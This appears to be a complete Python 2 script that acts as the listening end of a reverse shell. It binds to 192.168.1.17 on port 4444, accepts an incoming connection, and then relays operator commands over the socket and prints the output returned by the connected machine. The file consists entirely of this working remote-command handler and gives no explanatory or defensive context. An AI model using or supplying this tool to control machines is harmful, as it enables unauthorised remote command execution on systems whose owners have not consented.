#!/usr/bin/env python
import socket

l = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
l.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
l.bind(("192.168.1.17", 4444))
l.listen(0)
print("[.] Waiting for incoming Connections...")
conn, ip_addr = l.accept()
print("[+] Got a connection from " + str(ip_addr[0]) + " from port " + str(ip_addr[1]))

while True:
    command = raw_input(">>")
    conn.send(command)
    output = conn.recv(1024)
    print(output)